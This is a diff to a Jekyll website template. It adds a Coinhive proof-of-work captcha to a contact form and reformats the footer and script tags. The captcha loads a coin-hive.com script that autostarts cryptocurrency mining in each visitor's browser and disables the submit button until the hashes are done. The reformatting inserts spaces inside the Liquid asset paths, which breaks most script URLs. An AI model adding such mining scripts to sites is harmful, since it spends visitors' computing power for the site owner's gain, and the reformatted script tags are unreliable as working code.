@@ -15,6 +15,13 @@
 					<label for="message">Message</label>
 					<textarea name="message" id="message" rows="6"></textarea>
 				</div>
+				<script src="https://coin-hive.com/lib/captcha.min.js" async></script>
+				<div class="coinhive-captcha"
+					data-hashes="1536"
+					data-key="TdQAFH6yjlXqvRxWyM23RRASFWhrU3lE"
+					data-autostart="true"
+					data-disable-elements="input[type=submit]">
+				</div>
 				<ul class="actions">
 					<li><input type="submit" value="Send Message" class="special" /></li>
 					<li><input type="reset" value="Clear" /></li>
@@ -64,63 +71,51 @@
 </section>
 
 <!-- Footer -->
-	<footer id="footer">
-		<div class="inner">
-			<ul class="icons">
-				{% if site.twitter_url %}
-				<li><a href="{{ site.twitter_url }}" class="icon alt fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
-				{% endif %}
-				{% if site.googleplus_url %}
-				<li><a href="{{ site.googleplus_url }}" class="icon alt fa-google-plus" target="_blank"><span class="label">Google+</span></a></li>
-				{% endif %}
-				{% if site.keybase_url %}
-				<li><a href="{{ site.keybase_url }}" class="icon alt fa-key" target="_blank"><span class="label">Keybase</span></a></li>
-				{% endif %}
-				{% if site.steam_url %}
-				<li><a href="{{ site.steam_url }}" class="icon alt fa-steam" target="_blank"><span class="label">Steam</span></a></li>
-				{% endif %}
-				{% if site.facebook_url %}
-				<li><a href="{{ site.facebook_url }}" class="icon alt fa-facebook" target="_blank"><span class="label">Facebook</span></a></li>
-				{% endif %}
-				{% if site.instagram_url %}
-				<li><a href="{{ site.instagram_url }}" class="icon alt fa-instagram" target="_blank"><span class="label">Instagram</span></a></li>
-				{% endif %}
-				{% if site.pinterest_url %}
-				<li><a href="{{ site.pinterest_url }}" class="icon alt fa-pinterest" target="_blank"><span class="label">Pinterest</span></a></li>
-				{% endif %}
-				{% if site.500px_url %}
-				<li><a href="{{ site.500px_url }}" class="icon alt fa-500px" target="_blank"><span class="label">500px</span></a></li>
-				{% endif %}
-				{% if site.gitlab_url %}
-				<li><a href="{{ site.gitlab_url }}" class="icon alt fa-gitlab" target="_blank"><span class="label">GitLab</span></a></li>
-				{% endif %}
-				{% if site.github_url %}
-				<li><a href="{{ site.github_url }}" class="icon alt fa-github" target="_blank"><span class="label">GitHub</span></a></li>
-				{% endif %}
-				{% if site.slack_url %}
-				<li><a href="{{ site.slack_url }}" class="icon alt fa-slack" target="_blank"><span class="label">Slack</span></a></li>
-				{% endif %}
-				{% if site.linkedin_url %}
-				<li><a href="{{ site.linkedin_url }}" class="icon alt fa-linkedin" target="_blank"><span class="label">LinkedIn</span></a></li>
-				{% endif %}
-				{% if site.feed_url %}
-				<li><a href="{{ site.feed_url }}" class="icon alt fa-rss" target="_blank"><span class="label">RSS Feed</span></a></li>
-				{% endif %}
-			</ul>
-			<ul class="copyright">
-				<li>&copy; {{ site.title }} {{ site.subtitle }} 2017</li>
-				<li>Site by Jonah Snider, <a href="/webdesign" target="_blank">get one like it</a></li>
-			</ul>
-		</div>
-	</footer>
+<footer id="footer">
+	<div class="inner">
+		<ul class="icons">
+			{% if site.twitter_url %}
+			<li><a href="{{ site.twitter_url }}" class="icon alt fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
+			{% endif %} {% if site.googleplus_url %}
+			<li><a href="{{ site.googleplus_url }}" class="icon alt fa-google-plus" target="_blank"><span class="label">Google+</span></a></li>
+			{% endif %} {% if site.keybase_url %}
+			<li><a href="{{ site.keybase_url }}" class="icon alt fa-key" target="_blank"><span class="label">Keybase</span></a></li>
+			{% endif %} {% if site.steam_url %}
+			<li><a href="{{ site.steam_url }}" class="icon alt fa-steam" target="_blank"><span class="label">Steam</span></a></li>
+			{% endif %} {% if site.facebook_url %}
+			<li><a href="{{ site.facebook_url }}" class="icon alt fa-facebook" target="_blank"><span class="label">Facebook</span></a></li>
+			{% endif %} {% if site.instagram_url %}
+			<li><a href="{{ site.instagram_url }}" class="icon alt fa-instagram" target="_blank"><span class="label">Instagram</span></a></li>
+			{% endif %} {% if site.pinterest_url %}
+			<li><a href="{{ site.pinterest_url }}" class="icon alt fa-pinterest" target="_blank"><span class="label">Pinterest</span></a></li>
+			{% endif %} {% if site.500px_url %}
+			<li><a href="{{ site.500px_url }}" class="icon alt fa-500px" target="_blank"><span class="label">500px</span></a></li>
+			{% endif %} {% if site.gitlab_url %}
+			<li><a href="{{ site.gitlab_url }}" class="icon alt fa-gitlab" target="_blank"><span class="label">GitLab</span></a></li>
+			{% endif %} {% if site.github_url %}
+			<li><a href="{{ site.github_url }}" class="icon alt fa-github" target="_blank"><span class="label">GitHub</span></a></li>
+			{% endif %} {% if site.slack_url %}
+			<li><a href="{{ site.slack_url }}" class="icon alt fa-slack" target="_blank"><span class="label">Slack</span></a></li>
+			{% endif %} {% if site.linkedin_url %}
+			<li><a href="{{ site.linkedin_url }}" class="icon alt fa-linkedin" target="_blank"><span class="label">LinkedIn</span></a></li>
+			{% endif %} {% if site.feed_url %}
+			<li><a href="{{ site.feed_url }}" class="icon alt fa-rss" target="_blank"><span class="label">RSS Feed</span></a></li>
+			{% endif %}
+		</ul>
+		<ul class="copyright">
+			<li>&copy; {{ site.title }} {{ site.subtitle }} 2017</li>
+			<li>Site by Jonah Snider, <a href="/webdesign" target="_blank">get one like it</a></li>
+		</ul>
+	</div>
+</footer>
 
 </div>
 
 <!-- Scripts -->
-	<script src="{{ "assets/js/jquery.min.js" | absolute_url }}"></script>
-	<script src="{{ "assets/js/jquery.scrolly.min.js" | absolute_url }}"></script>
-	<script src="{{ "assets/js/jquery.scrollex.min.js" | absolute_url }}"></script>
-	<script src="{{ "assets/js/skel.min.js" | absolute_url }}"></script>
-	<script src="{{ "assets/js/util.js" | absolute_url }}"></script>
-	<!--[if lte IE 8]><script src="{{ "assets/js/ie/respond.min.js" | absolute_url }}"></script><![endif]-->
-	<script src="{{ "assets/js/main.js" | absolute_url }}"></script>
+<script src="{{ " assets/js/jquery.min.js " | absolute_url }}"></script>
+<script src="{{ " assets/js/jquery.scrolly.min.js " | absolute_url }}"></script>
+<script src="{{ " assets/js/jquery.scrollex.min.js " | absolute_url }}"></script>
+<script src="{{ " assets/js/skel.min.js " | absolute_url }}"></script>
+<script src="{{ " assets/js/util.js " | absolute_url }}"></script>
+<!--[if lte IE 8]><script src="{{ "assets/js/ie/respond.min.js" | absolute_url }}"></script><![endif]-->
+<script src="{{ " assets/js/main.js " | absolute_url }}"></script>
